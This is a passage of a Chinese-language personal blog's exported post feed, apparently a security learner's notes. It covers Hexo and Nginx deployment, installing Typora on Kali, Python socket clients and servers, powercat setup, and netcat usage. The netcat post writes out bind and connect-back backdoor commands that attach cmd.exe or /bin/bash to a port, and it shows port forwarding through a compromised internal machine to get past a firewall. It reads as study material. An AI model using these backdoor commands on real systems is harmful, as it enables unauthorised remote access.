class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ln -s /opt/nodejs/bin/node /usr/local/bin/node</span><br><span class="line">ln -s /opt/nodejs/bin/npm  /usr/local/bin/npm</span><br><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">node -v</span><br></pre></td></tr></table></figure><h3 id="五、hexo-部署"><a href="#五、hexo-部署" class="headerlink" title="五、hexo 部署"></a>五、hexo 部署</h3><ol><li>安装hexo</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g </span><br></pre></td></tr></table></figure><ol start="2"><li>采用软连接的方式将hexo添加入全局变量</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /opt/nodejs/lib/node_modules/hexo-cli/bin/hexo /usr/local/bin/hexo</span><br></pre></td></tr></table></figure><ol start="3"><li>将自己GitHub中存储的hexo博客ssh下载到主机中</li></ol><h3 id="六、使用Nginx部署Hexo站点"><a href="#六、使用Nginx部署Hexo站点" class="headerlink" title="六、使用Nginx部署Hexo站点"></a>六、使用Nginx部署Hexo站点</h3><ol><li>Nginx安装</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y nginx</span><br></pre></td></tr></table></figure><ol start="2"><li>配置Nginx</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -t</span><br></pre></td></tr></table></figure><ol start="3"><li>使用vim打开nginx.conf文件</li></ol><ul><li>注意：有时该配置文件会不同于下面显示的，请参考网上其他教程从官网下载</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/s6S4k8"><img "" class="lazyload placeholder" data-original="https://s3.ax1x.com/2021/01/18/s6S4k8.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="s6S4k8.png"></a></p><ol start="4"><li>启动Nginx</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start nginx.service</span><br></pre></td></tr></table></figure><ol start="5"><li>重启Nginx</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart nginx.service</span><br></pre></td></tr></table></figure><h3 id="七、配置本地hexo"><a href="#七、配置本地hexo" class="headerlink" title="七、配置本地hexo"></a>七、配置本地hexo</h3><ul><li>博客根目录_config下增加</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">    type: git  (必须是git)</span><br><span class="line">    repo: root@***(服务器外网ip):#仓库地址</span><br><span class="line">    branch: master   </span><br></pre></td></tr></table></figure><ul><li>进入自己的hexo博客目录</li><li>hexo clean</li><li>hexo g</li><li>hexo d</li><li>搜索自己的域名便可访问</li></ul>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali安装typroa</title>
      <link href="/2020/09/14/kali%20%E5%AE%89%E8%A3%85typora/"/>
      <url>/2020/09/14/kali%20%E5%AE%89%E8%A3%85typora/</url>
      
        <content type="html"><![CDATA[<h2 id="kali-安装typora"><a href="#kali-安装typora" class="headerlink" title="kali 安装typora"></a>kali 安装typora</h2><h3 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h3><ul><li>官网下载文件解压，并移动到 /opt 文件夹下</li></ul><h3 id="二、赋权"><a href="#二、赋权" class="headerlink" title="二、赋权"></a>二、赋权</h3><ul><li>在typora目录的bin文件夹下执行命令</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./typora</span><br></pre></td></tr></table></figure><ul><li><p>会报错[7442:0707/173355.682906:FATAL:setuid_sandbox_host.cc(157)] The SUID sandbox helper binary was found, but is not configured correctly. Rather than run without sandboxing I’m aborting now. You need to make sure that /opt/Typora-linux-x64/chrome-sandbox is owned by root and has mode 4755.</p></li><li><p>执行命令</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chown root chrome-sandbox</span><br><span class="line">sudo chgrp root chrome-sandbox</span><br><span class="line">sudo chmod 4755 chrome-sandbox</span><br></pre></td></tr></table></figure><h3 id="三、添加快捷方式"><a href="#三、添加快捷方式" class="headerlink" title="三、添加快捷方式"></a>三、添加快捷方式</h3><ul><li>vim typora.desktop</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Name=Typora</span><br><span class="line">Exec=/opt/Typora-linux-x64/Typora</span><br><span class="line">Type=Application</span><br><span class="line">Icon=/opt/Typora-linux-x64/resources/app/asserts/icon/icon_512x512.png</span><br></pre></td></tr></table></figure><ul><li>将快捷方式复制到/usr/share/applications</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp typora.desktop /usr/share/applications/</span><br></pre></td></tr></table></figure><ul><li>关机重启</li></ul>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> typroa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>necat的使用</title>
      <link href="/2020/09/14/netcat/"/>
      <url>/2020/09/14/netcat/</url>
      
        <content type="html"><![CDATA[<h2 id="netcat命令选项"><a href="#netcat命令选项" class="headerlink" title="netcat命令选项"></a>netcat命令选项</h2><h4 id="本文参考文章链接"><a href="#本文参考文章链接" class="headerlink" title="本文参考文章链接"></a>本文参考文章链接</h4><p><a href="https://www.fujieace.com/linux/nc-2.html">本文参考文章链接1</a></p><p><a href="https://jiajunhuang.com/articles/2020_09_19-linux_cmd_netcat.md.html">本文参考文章链接2</a></p><p><a href="https://www.cnblogs.com/lpfuture/p/5719066.html">本文参考文章链接3</a></p><span id="more"></span><h3 id="常用命令选项"><a href="#常用命令选项" class="headerlink" title="常用命令选项"></a>常用命令选项</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">## 网络模式和代理相关</span><br><span class="line">-l 监听，作服务器。不填时作客户端。</span><br><span class="line">-u UDP模式。不填时默认TCP模式。</span><br><span class="line">-X 和 -x 是代理相关的选项</span><br><span class="line"></span><br><span class="line">## 其余常用选项</span><br><span class="line">-v verbose模式，打印更多日志</span><br><span class="line">-z 连接以后就断开，用于测试网络连接是否连通 //探测端口的连通性</span><br><span class="line">-w 超时时间，单位是秒</span><br><span class="line">-s 指定source addr</span><br><span class="line">-p 指定source port</span><br><span class="line">-n 只识别IP地址，不查询DNS</span><br><span class="line">-k 处理完一个请求之后，继续监听下一个</span><br><span class="line">-d 脱离命令行窗口，在后台运行，常用于后门建立的过程</span><br><span class="line">-e 执行某个程序，常用于后门建立的过程</span><br><span class="line">-L 设置netcat处于监听状态等待链接，当客户端断开，服务器依旧回到等待状态</span><br></pre></td></tr></table></figure><h3 id="基本全部命令选项"><a href="#基本全部命令选项" class="headerlink" title="基本全部命令选项"></a>基本全部命令选项</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">用法：</span><br><span class="line"></span><br><span class="line">ncat [选项] [主机名] [端口]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">花费时间的选项以秒为单位。 附加“ ms”毫秒，“ s”表示秒，“ m”表示分钟，或“ h”表示小时（例如500ms）。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">-4    仅使用IPv4</span><br><span class="line"></span><br><span class="line">-6    仅使用IPv6</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">-U, --unixsock 仅使用Unix域套接字</span><br><span class="line"></span><br><span class="line">--vsock 仅使用vsock套接字</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">-C, --crlf 将CRLF用于EOL序列</span><br><span class="line"></span><br><span class="line">-c, --sh-exec &lt;command&gt; 通过/bin/sh执行给定命令</span><br><span class="line"></span><br><span class="line">-e, --exec &lt;command&gt; 执行给定命令</span><br><span class="line"></span><br><span class="line">--lua-exec &lt;filename&gt; 执行给定的Lua脚本</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">-g hop1[,hop2,...] 松散的源路由跳跃点（最大8个）</span><br><span class="line"></span><br><span class="line">-G &lt;n&gt; 松散的源路由跳跃指针（4、8、12，...）</span><br><span class="line"></span><br><span class="line">-m, --max-conns &lt;n&gt; 最大&lt;n&gt;同时连接</span><br><span class="line"></span><br><span class="line">-h, --help 显示此帮助屏幕</span><br><span class="line"></span><br><span class="line">-d, --delay &lt;time&gt; 在读/写之间等待时间</span><br><span class="line"></span><br><span class="line">-o, --output &lt;filename&gt; 将会话数据转储到文件中</span><br><span class="line"></span><br><span class="line">-x, --hex-dump &lt;filename&gt; 将会话数据以十六进制形式转储到文件中</span><br><span class="line"></span><br><span class="line">-i, --idle-timeout &lt;time&gt; 空闲读/写超时时间</span><br><span class="line"></span><br><span class="line">-p, --source-port port 指定要使用的源端口</span><br><span class="line"></span><br><span class="line">-s, --source addr 指定要使用的源地址（不影响-l）</span><br><span class="line"></span><br><span class="line">-l, --listen 绑定并监听传入的连接</span><br><span class="line"></span><br><span class="line">-k, --keep-open 在侦听模式下接受多个连接</span><br><span class="line"></span><br><span class="line">-n, --nodns 不通过DNS解析主机名</span><br><span class="line"></span><br><span class="line">-t, --telnet 回答Telnet协商</span><br><span class="line"></span><br><span class="line">-u, --udp 使用UDP代替默认TCP</span><br><span class="line"></span><br><span class="line">--sctp 使用SCTP代替默认TCP</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">-v, --verbose 使用SCTP代替默认TCP</span><br><span class="line"></span><br><span class="line">-w, --wait &lt;time&gt; 连接超时时间</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">-z   零I/O模式，仅报告连接状态</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure><h2 id="1-模拟聊天"><a href="#1-模拟聊天" class="headerlink" title="1. 模拟聊天"></a>1. 模拟聊天</h2><ul><li>服务器</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p [端口号]</span><br></pre></td></tr></table></figure><ul><li>客户端</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [服务器ip] [服务器端口]</span><br></pre></td></tr></table></figure><h2 id="2-Banner抓取方法"><a href="#2-Banner抓取方法" class="headerlink" title="2.Banner抓取方法"></a>2.Banner抓取方法</h2><ul><li>Banner是一个文本，Banner是一个你连接的服务器发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&quot; | nc -v -n w1 [target_ip] [开始端口-结束端口]</span><br></pre></td></tr></table></figure><h2 id="3-文件传输"><a href="#3-文件传输" class="headerlink" title="3.文件传输"></a>3.文件传输</h2><h3 id="从客户端传输文件到服务器"><a href="#从客户端传输文件到服务器" class="headerlink" title="从客户端传输文件到服务器"></a>从客户端传输文件到服务器</h3><ul><li>服务器</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p [端口号] &gt; out_filename</span><br></pre></td></tr></table></figure><ul><li>客户端</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [目标IP] [目标端口] &lt; in_flimename</span><br></pre></td></tr></table></figure><h3 id="从服务器传输文件到客户端"><a href="#从服务器传输文件到客户端" class="headerlink" title="从服务器传输文件到客户端"></a>从服务器传输文件到客户端</h3><ul><li>服务器</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p [端口号] &lt; in_filename</span><br></pre></td></tr></table></figure><ul><li>客户端</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [目标IP] [目标端口] &gt; out_flimename</span><br></pre></td></tr></table></figure><h2 id="4-目录传输（与文件传输类似）"><a href="#4-目录传输（与文件传输类似）" class="headerlink" title="4.目录传输（与文件传输类似）"></a>4.目录传输（与文件传输类似）</h2><ul><li>服务器</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf - dir_name | nc -l [port_id]</span><br></pre></td></tr></table></figure><ul><li>客户端</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -n [target_ip] [target_port] | tar -xvf - </span><br></pre></td></tr></table></figure><h2 id="5-windows建立后门的方法"><a href="#5-windows建立后门的方法" class="headerlink" title="5. windows建立后门的方法"></a>5. windows建立后门的方法</h2><h3 id="服务器——监听型后门"><a href="#服务器——监听型后门" class="headerlink" title="服务器——监听型后门"></a>服务器——监听型后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p [port_id] -e cmd.exe</span><br></pre></td></tr></table></figure><h3 id="客户端——连接型后门"><a href="#客户端——连接型后门" class="headerlink" title="客户端——连接型后门"></a>客户端——连接型后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [target_ip] [target_port] -e cmd.exe</span><br></pre></td></tr></table></figure><h2 id="6、Linux下建立后门"><a href="#6、Linux下建立后门" class="headerlink" title="6、Linux下建立后门"></a>6、Linux下建立后门</h2><h3 id="服务器——监听型后门-1"><a href="#服务器——监听型后门-1" class="headerlink" title="服务器——监听型后门"></a>服务器——监听型后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p [port_id] -e /bin/bash</span><br></pre></td></tr></table></figure><h3 id="客户端——连接型后门-1"><a href="#客户端——连接型后门-1" class="headerlink" title="客户端——连接型后门"></a>客户端——连接型后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [target_ip] [target_port] -e /bin/bash</span><br></pre></td></tr></table></figure><h2 id="7、连接转发"><a href="#7、连接转发" class="headerlink" title="7、连接转发"></a>7、连接转发</h2><ul><li>可以解决的问题</li></ul><ol><li>对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台弱鸡进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">假设机器A和机器B是内网机器，机器B是我们的目标机器，机器C是外网机器，机器C和机器A是出于同一网段的，可以互相访问，机器C不可以访问机器B</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># bat文件中的内容： nc [ip_B] [port_B]</span><br><span class="line">A: nc -l -p [port_A] -e XX.bat</span><br><span class="line">B: nc -l -p [port_B] </span><br><span class="line">C: nc [ip_A] [prt_A]</span><br></pre></td></tr></table></figure><ol start="2"><li>对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">## 原理同上</span><br></pre></td></tr></table></figure><h2 id="8、反弹shell"><a href="#8、反弹shell" class="headerlink" title="8、反弹shell"></a>8、反弹shell</h2><p><a href="https://imgchr.com/i/BFDrmd"><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/10/22/BFDrmd.md.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="BFDrmd.md.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> necat </tag>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>powercat的使用</title>
      <link href="/2020/09/14/powercat/"/>
      <url>/2020/09/14/powercat/</url>
      
        <content type="html"><![CDATA[<h1 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h1><ul><li>powercat是netcat的powershell版本，可以在windows系统上使用</li></ul><h2 id="一、安装powercat"><a href="#一、安装powercat" class="headerlink" title="一、安装powercat"></a>一、安装powercat</h2><ul><li>[GitHub下载链接](git clone <a href="https://github.com/besimorhino/powercat.git">https://github.com/besimorhino/powercat.git</a>)</li><li>管理员权限打开powershell，进入powercat下载目录，打开README.md文档，按照上面的步骤进行操作，如果显示系统无法加载这种情况：</li></ul><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">: 无法加载文件 C:\Users\herol\Documents\powercat\powercat.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:/go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies。</span><br></pre></td></tr></table></figure><ul><li>在powershell输入以下命令（注意要以管理员权限）：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy RemoteSigned</span><br></pre></td></tr></table></figure><ul><li>输入y即可，接着可以输入powercat -h测试是否安装成功</li></ul><h2 id="二、使用powercat"><a href="#二、使用powercat" class="headerlink" title="二、使用powercat"></a>二、使用powercat</h2><ul><li>powercat -h 或 vim README.md查看帮助文件 </li></ul>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> tool </tag>
            
            <tag> powercat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python网络编程</title>
      <link href="/2020/09/14/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
      <url>/2020/09/14/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="python网络编程"><a href="#python网络编程" class="headerlink" title="python网络编程"></a>python网络编程</h1><h3 id="一、客户端"><a href="#一、客户端" class="headerlink" title="一、客户端"></a>一、客户端</h3><h4 id="TCP客户端"><a href="#TCP客户端" class="headerlink" title="TCP客户端"></a>TCP客户端</h4><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立变量：目标主机和目标端口</span></span><br><span class="line">host = ***</span><br><span class="line">port = ***</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立一个socket对象</span></span><br><span class="line">client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接客户端</span></span><br><span class="line"><span class="comment"># connect内的是一个元组，代表的是一个具体的地址</span></span><br><span class="line">client.connect((host, port))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送数据</span></span><br><span class="line">client.send(<span class="string">&quot;hello, world!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接受数据</span></span><br><span class="line"><span class="comment"># 最大接受1024字节数据</span></span><br><span class="line">response = client.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭套接字</span></span><br><span class="line">client.close()</span><br></pre></td></tr></table></figure><h4 id="UDP客户端"><a href="#UDP客户端" class="headerlink" title="UDP客户端"></a>UDP客户端</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立变量：目标主机和目标端口</span></span><br><span class="line">host = ***</span><br><span class="line">port = ***</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立一个socket对象</span></span><br><span class="line">client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接客户端</span></span><br><span class="line"><span class="comment"># connect内的是一个元组，代表的是一个具体的地址</span></span><br><span class="line">client.connect((host, port))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送数据</span></span><br><span class="line">client.sendto(<span class="string">&quot;hello, world!&quot;</span>, (host, port))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收数据</span></span><br><span class="line"><span class="comment"># 最大接受1024字节数据</span></span><br><span class="line">data, addr = client.recvfrom(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭套接字</span></span><br><span class="line">client.close()</span><br></pre></td></tr></table></figure><h3 id="二、服务器"><a href="#二、服务器" class="headerlink" title="二、服务器"></a>二、服务器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># bind_id留空的意思是本地IP 127.0.0.1</span></span><br><span class="line">bind_id = <span class="string">&quot;&quot;</span>  </span><br><span class="line">bind_port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">server.bind((bind_id, bind_port))</span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] Listening on &#123;&#125;:&#123;&#125;&#x27;</span> .<span class="built_in">format</span>(bind_id, bind_port))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_client</span>(<span class="params">client_socket</span>):</span></span><br><span class="line">    request = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Received: &#123;&#125;&#x27;</span> .<span class="built_in">format</span>(request))</span><br><span class="line">    send_it = <span class="string">&quot;I love you&quot;</span></span><br><span class="line">    client_socket.send(send_it.encode())</span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">client, address = server.accept()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Accepted connection from: &#123;&#125;:&#123;&#125;&quot;</span> .<span class="built_in">format</span>(client, address))</span><br><span class="line">client_handler_t1 = threading.Thread(target=handle_client, args=(client, ))</span><br><span class="line">client_handler_t1.start()</span><br></pre></td></tr></table></figure><h3 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h3><h4 id="服务器（采取多线程）"><a href="#服务器（采取多线程）" class="headerlink" title="服务器（采取多线程）"></a>服务器（采取多线程）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="comment"># from struct import pack</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadSocket</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port</span>):</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = 